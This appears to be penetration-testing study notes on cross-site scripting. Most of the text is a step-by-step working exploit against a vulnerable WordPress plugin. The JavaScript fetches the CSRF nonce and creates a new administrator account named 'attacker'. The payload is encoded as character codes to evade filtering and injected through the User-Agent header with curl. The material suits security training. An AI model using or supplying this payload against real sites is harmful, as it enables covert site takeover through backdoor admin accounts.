
XSS can be used to redirect users to malicious pages, hijack user sessions and steal users credentials (with DOM based XSS)

### Identifying XSS Vulnerabilities

1. Find input fields for testing
2. `< > ' " { } ;` - Test user input fields to see if any of the symbols come back filtered - If not there is a chance of XSS vulnerability
3. Craft payload for injection


### Executing an XSS found in WordPress Example

In this example, we have found a vulnerability in a WordPress plugin which we are going to use to create a new administrative user since the session cookie is HTTP only for the main administrator. To do this we need to retrieve the nonce in order to bypass CSRF protection. Once done, we can then craft and encode a payload to send to the server along with out captured nonce.

Step one:

Creating a JavaScript method for retrieving the nonce.

```
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```

Step Two:

Adding the functionality to create the new admin user:

```
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

Which leaves us with the following script:

```
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

Step 3:

Compression (minifying) and encoding the payload to avoid bad character detection and filtering.

Compress the payload at: https://jscompress.com/ and save it locally.

Encode the payload as UTF-16 integer code:

```
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```

With the output we can now send out crafted payload through curl.

Step 4:

Exploit with curl using `curl -i http://<URL> --user-agent "<script>eval(String.fromCharCode(OUTPUT_FROM_ENCODING))</script>"" --proxy 127.0.0.1:8080`

This will also pass the request through Burp Suite.

Step 5:

No we wait for the admin to trigger the XSS through the plugin in their admin panel. Once triggered we will be able to log in the the user we have created through the exploit.